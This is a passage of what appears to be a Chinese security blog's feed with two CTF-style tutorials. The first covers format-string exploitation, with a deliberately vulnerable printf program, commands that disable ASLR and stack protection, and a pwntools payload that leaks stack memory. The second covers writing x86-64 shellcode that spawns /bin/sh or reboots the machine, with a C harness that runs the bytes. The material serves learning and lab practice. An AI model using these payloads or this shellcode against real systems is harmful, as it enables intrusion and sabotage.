class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x4011e9 &lt;main+115&gt;       mov    rdi, rax</span><br><span class="line">     0x4011ec &lt;main+118&gt;       mov    eax, 0x0</span><br><span class="line">     0x4011f1 &lt;main+123&gt;       call   0x401070 &lt;printf@plt&gt;</span><br><span class="line"> →   0x4011f6 &lt;main+128&gt;       mov    edi, 0xa</span><br><span class="line">     0x4011fb &lt;main+133&gt;       call   0x401060 &lt;putchar@plt&gt;</span><br><span class="line">     0x401200 &lt;main+138&gt;       nop    </span><br><span class="line">     0x401201 &lt;main+139&gt;       leave  </span><br><span class="line">     0x401202 &lt;main+140&gt;       ret    </span><br><span class="line">     0x401203                  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">──────────────────────────────────────────────────────── source:fmtdemo.c+8 ────</span><br><span class="line">      3     char format[128];</span><br><span class="line">      4     int arg1 = 1, arg2 = 0x88888888, arg3 = -1;</span><br><span class="line">      5     char arg4[10] = &quot;ABCDEFGH&quot;;</span><br><span class="line">      6     scanf(&quot;%s&quot;, format);</span><br><span class="line">      7     printf(format, arg1, arg2, arg3, arg4);</span><br><span class="line"> →    8     printf(&quot;\n&quot;);</span><br><span class="line">      9 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x4011f6 <span class="keyword">in</span> main (), reason: TEMPORARY BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/20g $rsp</span><br><span class="line">0x7fffffffded0:0x400000000000000x484746450000</span><br><span class="line">0x7fffffffdee0:0x31302578363130250x2564323330257836</span><br><span class="line">0x7fffffffdef0:0x2e2e2e2e6e2431310x7fffffffded6</span><br><span class="line">0x7fffffffdf00:0x00x0</span><br><span class="line">0x7fffffffdf10:0x4000400xf0b5ff</span><br><span class="line">0x7fffffffdf20:0xc20x7fffffffdf57</span><br><span class="line">0x7fffffffdf30:0x7fffffffdf560x40125d</span><br><span class="line">0x7fffffffdf40:0x7ffff7fa72e80x401210</span><br><span class="line">0x7fffffffdf50:0x00x401090</span><br><span class="line">0x7fffffffdf60:0xffffffffffffe0600x188888888</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">00000000000000010000000088888888-0000000000000000000000000000001....�����</span><br><span class="line">[Inferior 1 (process 25193) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>对比 <code>printf()</code> 函数执行前后的输出，<code>printf</code> 首先解析 <code>%11$n</code> 找到获得地址 <code>0x00007fffffffdef8</code> 的值 <code>0x00007fffffffded6</code>，然后跳转到地址 <code>0x00007fffffffded6</code>，将它的值 <code>0x4443424100000000</code> 覆盖为 <code>0x40000000000000</code>，就得到 <code>arg4=0x40000000000000</code>。</p><h4 id="225-任意地址内存覆盖"><a class="markdownIt-Anchor" href="#225-任意地址内存覆盖"></a> 2.2.5 任意地址内存覆盖</h4><p>覆盖任意地址，我们只需要将上节中的地址更改一下就能任意覆盖了。</p><p>最后还得强调两点：</p><ul><li>首先是需要关闭整个系统的 ASLR 保护，这可以保证栈在 gdb 环境中和直接运行中都保持不变，但这两个栈地址不一定相同。</li><li>其次因为在 gdb 调试环境中的栈地址和直接运行程序是不一样的，所以我们需要结合格式化字符串漏洞读取内存，先泄露一个地址出来，然后根据泄露出来的地址计算实际地址。</li></ul><h4 id="226-ctf-中的格式化字符串漏洞"><a class="markdownIt-Anchor" href="#226-ctf-中的格式化字符串漏洞"></a> 2.2.6 CTF 中的格式化字符串漏洞</h4><blockquote><p>以下内容参考：<a href="https://bbs.pediy.com/thread-268850.htm">64位格式化字符串漏洞pwn入门</a></p></blockquote><p>目标程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fmtdemoI.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> arg1 =<span class="number">1</span>,arg2=<span class="number">0x88888888</span>,arg3=<span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> arg4[<span class="number">10</span>]=<span class="string">&quot;ABCDEFGH&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,format);</span><br><span class="line">    <span class="built_in">printf</span>(format,arg1,arg2,arg3,arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg4的地址：%p\n&quot;</span>,&amp;arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（可能要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY,PIE。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie fmtdemoI.c -o fmtdemoI</span><br></pre></td></tr></table></figure><p>3.执行fmtdemoI获取arg4的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python -c &#x27;print(&quot;A&quot;*8+&quot;.%p&quot;*20)&#x27;</span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemoI</span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">AAAAAAAA.0x1.0x88888888.0xffffffff.0x7fffffffdf36.0x7c.0x4241000000000000.0x484746454443.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70.0x7fffffffdfb7.0x7fffffffdfb6.0x40126d.0x7ffff7fa72e8arg4的地址：0x7fffffffdf36</span><br></pre></td></tr></table></figure><p>如上，AAAAAAAA（即4141414141414141）在格式化字符串的后8个偏移。arg4的地址为0x7fffffffdf36。</p><p>经调试，arg4的偏移为10，并且还要注意字符对齐。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python -c &#x27;print(&quot;A&quot;*11+&quot;%10$s&quot;+&quot;\x36\xdf\xff\xff\xff\x7f\x00\x00&quot;)&#x27; | ./fmtdemoI</span><br><span class="line">AAAAAAAAAAAABCDEFGH6����arg4的地址：0x7fffffffdf36</span><br></pre></td></tr></table></figure><p>以下为 python3程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fmtdemoI.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file = ELF(<span class="string">&quot;./fmtdemoI&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io = process(<span class="string">&quot;./fmtdemoI&quot;</span>)</span><br><span class="line">addr_arg4 = <span class="number">0x7fffffffdf36</span> <span class="comment">#arg4的地址</span></span><br><span class="line">payload = (<span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>)+(<span class="string">b&#x27;%10$s&#x27;</span>)+p64(addr_arg4)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行 <a href="http://fmtdemoI.py">fmtdemoI.py</a>，由于此时，获得的 <code>arg4</code> 的地址为 <code>0x7fffffffdf26</code>，所以跟着调整我们的 <a href="http://fmtdemoI.py">fmtdemoI.py</a> ，<code>addr_arg4 = 0x7fffffffdf26</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python3 fmt.py </span><br><span class="line">[*] &#x27;/home/sakura/文档/print/fmtdemoI&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &#x27;./fmtdemoI&#x27; argv=[b&#x27;./fmtdemoI&#x27;] : pid 26174</span><br><span class="line">b&#x27;AAAAAAAAAAA%10$s\xd6\xde\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">[DEBUG] Sent 0x19 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 25  31 30 24 73  │AAAA│AAAA│AAA%│10$s│</span><br><span class="line">    00000010  d6 de ff ff  ff 7f 00 00  0a                        │····│····│·│</span><br><span class="line">    00000019</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./fmtdemoI&#x27; stopped with exit code 10 (pid 26174)</span><br><span class="line">[DEBUG] Received 0x31 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 d6  de ff ff ff  │AAAA│AAAA│AAA·│····│</span><br><span class="line">    00000010  7f 61 72 67  34 e7 9a 84  e5 9c b0 e5  9d 80 ef bc  │·arg│4···│····│····│</span><br><span class="line">    00000020  9a 30 78 37  66 66 66 66  66 66 66 64  66 32 36 0a  │·0x7│ffff│fffd│f26·│</span><br><span class="line">    00000030  0a                                                  │·│</span><br><span class="line">    00000031</span><br><span class="line">AAAAAAAAAAA\xd6\xde\xff\xff\xff\x7farg4的地址：0x7fffffffdf26</span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[DEBUG] Sent 0x1 bytes:</span></span><br><span class="line">    10 * 0x1</span><br><span class="line">[*] Got EOF while sending in interactive</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/sakura/.local/lib/python3.8/site-packages/pwnlib/tubes/process.py&quot;, line 746, in close</span><br><span class="line">    fd.close()</span><br><span class="line">BrokenPipeError: [Errno 32] Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python3 fmt.py </span><br><span class="line">[*] &#x27;/home/sakura/文档/print/fmtdemoI&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &#x27;./fmtdemoI&#x27; argv=[b&#x27;./fmtdemoI&#x27;] : pid 26190</span><br><span class="line">b&#x27;AAAAAAAAAAA%10$s&amp;\xdf\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">[DEBUG] Sent 0x19 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 25  31 30 24 73  │AAAA│AAAA│AAA%│10$s│</span><br><span class="line">    00000010  26 df ff ff  ff 7f 00 00  0a                        │&amp;···│····│·│</span><br><span class="line">    00000019</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./fmtdemoI&#x27; stopped with exit code 10 (pid 26190)</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  42 43 44 45  │AAAA│AAAA│AAAA│BCDE│</span><br><span class="line">    00000010  46 47 48 26  df ff ff ff  7f 61 72 67  34 e7 9a 84  │FGH&amp;│····│·arg│4···│</span><br><span class="line">    00000020  e5 9c b0 e5  9d 80 ef bc  9a 30 78 37  66 66 66 66  │····│····│·0x7│ffff│</span><br><span class="line">    00000030  66 66 66 64  66 32 36 0a  0a                        │fffd│f26·│·│</span><br><span class="line">    00000039</span><br><span class="line">AAAAAAAAAAAABCDEFGH&amp;\xdf\xff\xff\xff\x7farg4的地址：0x7fffffffdf26</span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"> </span></span><br></pre></td></tr></table></figure><p>可以看到，上面输出AAAAAAAA后紧接着输出了ABCDEFGH，攻击成功！<br>总结：<br>1.arg4地址要放payload的最后，否则64位地址高位是0，小端存储时高位的0会被放在高地址处，读完arg4的地址时字符串就会被00截断。<br>2.‘A’*11+’%10$s’为16个字节，要注意对齐16字节。<br>3.‘A’*11+’%10$s’占用一个偏移。<br>4.若为32位，且地址高位没有0，则payload构造为p32(addr_arg4)+’%8$s’.（偏移不一定为8，看情况）</p><p>可以看到这种方法非常强大，可以获得栈中任意的值。</p><blockquote><p>参考：</p><p>​<a href="https://www.anquanke.com/post/id/194458">64位格式化字符串漏洞修改got表利用详解</a></p><p>​<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">格式化字符串漏洞</a></p><p>​<a href="https://bbs.pediy.com/thread-268850.htm">64位格式化字符串漏洞pwn入门</a></p><p>​<a href="https://blog.csdn.net/Little_Small_Joze/article/details/114650396">python3的pwn用法——when_did_you_born题解</a>——这里我了解到 python3 的 can’t concat str to bytes 问题。</p><p>​<a href="https://blog.csdn.net/weixin_39943442/article/details/114405599">python3-pwntools教程_CTF PWN工具篇1</a>——python3 的 pwntools 使用教程</p></blockquote><blockquote><p>相关文章：</p><p>​<a href="https://www.anquanke.com/post/id/222623#h2-0">格式化字符串大杂烩</a></p><p>​<a href="https://www.anquanke.com/post/id/184717#h2-0">非栈上格式化字符串漏洞利用技巧</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-格式化输出函数&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-格式化输出函数&quot;&gt;&lt;/a&gt; 1 格式化输出函数&lt;/h2&gt;
&lt;h3 id=&quot;11-变参函数&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="格式化字符串" scheme="https://www.rgzzplus.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>Linux_shellcode开发之实战</title>
    <link href="https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/"/>
    <id>https://www.rgzzplus.com/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/</id>
    <published>2022-08-08T14:39:50.000Z</published>
    <updated>2022-08-27T04:41:50.096Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-打开-terminal"><a class="markdownIt-Anchor" href="#1-打开-terminal"></a> 1. 打开 terminal</h2><p>首先我们来试试最经典的例子 ---- 打开 terminal</p><p>那么问题来了用c语言该怎么写？</p><blockquote><p>int execve(const char *<em><strong>filename</strong></em>, char *const <strong>argv</strong>[], char *const <strong>envp</strong>[]);</p><p>filename:要执行的程序</p><p>argv[]：传递给新程序的参数字符串数组</p><p>envp[]:传递给新程序的环境变量字符串数组</p></blockquote><h3 id="11-c语言版本"><a class="markdownIt-Anchor" href="#11-c语言版本"></a> 1.1 C语言版本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">name[<span class="number">0</span>] = <span class="string">&quot;bin/sh&quot;</span>;</span><br><span class="line">name[<span class="number">1</span>] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用gcc编译一下，看看能否运行？</p><ul><li>-z execstack 关闭 canary</li><li>-g 添加信息，便于 gdb 调试</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc getTerminal.c -o terminal -z execstack -g</span><br><span class="line">./terminal</span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220806232610222-16615746600301.png" alt="image-20220806232610222"></p><p>可以看到程序成功执行，说明我们的思路没有问题。</p><h3 id="12-写汇编"><a class="markdownIt-Anchor" href="#12-写汇编"></a> 1.2 写汇编</h3><p>从上面可以看到，这个 execve(“bin/sh”, [“bin/sh”], NULL) 参数是没有问题的，根据 execve 的系统调用号 0x3b 来布置函数栈帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_sh64.o -o execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220807220010173-16615746600312.png" alt="image-20220807220010173"></p><h3 id="13-提取机器码"><a class="markdownIt-Anchor" href="#13-提取机器码"></a> 1.3 提取机器码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/execveDir$ objdump -d execve_sh64</span><br><span class="line"></span><br><span class="line">execve_sh64：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 d2             xor    %rdx,%rdx</span><br><span class="line">  401003:48 bb 2f 2f 62 69 6e movabs $0x68732f6e69622f2f,%rbx</span><br><span class="line">  40100a:2f 73 68 </span><br><span class="line">  40100d:48 c1 eb 08          shr    $0x8,%rbx</span><br><span class="line">  401011:53                   push   %rbx</span><br><span class="line">  401012:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  401015:50                   push   %rax</span><br><span class="line">  401016:57                   push   %rdi</span><br><span class="line">  401017:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  40101a:b0 3b                mov    $0x3b,%al</span><br><span class="line">  40101c:0f 05                syscall </span><br><span class="line"></span><br><span class="line">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; </span><br></pre></td></tr></table></figure><p>自动提取机器码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br></pre></td></tr></table></figure><h3 id="14-测试"><a class="markdownIt-Anchor" href="#14-测试"></a> 1.4 测试</h3><p>将机器码嵌入C语言运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc execve_sh64.c -o execve_sh64 -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_sh64</span></span><br></pre></td></tr></table></figure><p>成功执行。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220807230925573-16615746600313.png" alt="image-20220807230925573"></p><h2 id="2-重启-reboot"><a class="markdownIt-Anchor" href="#2-重启-reboot"></a> 2. 重启 reboot</h2><h3 id="21-找到指令位置"><a class="markdownIt-Anchor" href="#21-找到指令位置"></a> 2.1 找到指令位置</h3><p>首先，查看 reboot 命令所在位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">whereis reboot</span></span><br><span class="line">reboot: /usr/sbin/reboot /usr/share/man/man8/reboot.8.gz</span><br></pre></td></tr></table></figure><p>用此路径（/usr/sbin/reboot）作为参数，进行系统调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/usr/sbin/reboot&quot;, [&quot;/usr/sbin/reboot&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;/usr/sbin/reboot&#x27;, rsi = &#x27;/usr/sbin/reboot&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">push  rdx</span><br><span class="line">movrbx, &#x27;n/reboot&#x27;</span><br><span class="line">pushrbx</span><br><span class="line">mov rbx, &#x27;/usr/sbi&#x27;</span><br><span class="line">push rbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h3 id="22-编译链接运行"><a class="markdownIt-Anchor" href="#22-编译链接运行"></a> 2.2 编译链接运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 execve_reboot.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 execve_reboot.o -o execve_reboot</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_reboot</span></span><br></pre></td></tr></table></figure><p>然后就重启了。</p><h3 id="23-提取机器码"><a class="markdownIt-Anchor" href="#23-提取机器码"></a> 2.3 提取机器码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 